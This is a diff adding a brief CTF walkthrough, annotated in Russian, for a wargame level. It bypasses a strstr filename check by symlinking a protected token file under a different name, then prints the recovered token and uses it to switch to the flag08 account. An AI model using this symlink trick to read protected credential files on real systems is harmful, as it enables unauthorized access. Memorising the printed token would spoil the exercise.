@@ -1,0 +1,39 @@
+1) ls
+level08  token
+
+2) ./level08 token 
+You may not access 'token'
+
+3) ls -l token
+-rw------- 1 flag08 flag08 26 Mar  5  2016 token
+
+Действительно прав нет, они принадлежат flag08
+
+Попробуем создать ссылку на этот файл, ведь ссылка будет принадлежать нам
+
+4) ln -s ~/token /tmp/lntoken
+
+5) ./level08 /tmp/lntoken
+You may not access '/tmp/lntoken'
+
+6) ltrace ./level08 /tmp/lntoken
+
+__libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("/tmp/lntoken", "token")                                                                                                   = "token"
+printf("You may not access '%s'\n", "/tmp/lntoken"You may not access '/tmp/lntoken'
+)                                                                               = 34
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+
+strstr("/tmp/lntoken", "token") говорит о том, что в названии ссылки не может быть слово token
+
+7)  ln -s ~/token /tmp/exp
+
+8) ./level08 /tmp/exp
+
+quif5eloekouj29ke0vouxean
+
+9) su flag08
+И вводим данный хеш
+
+10) getflag 
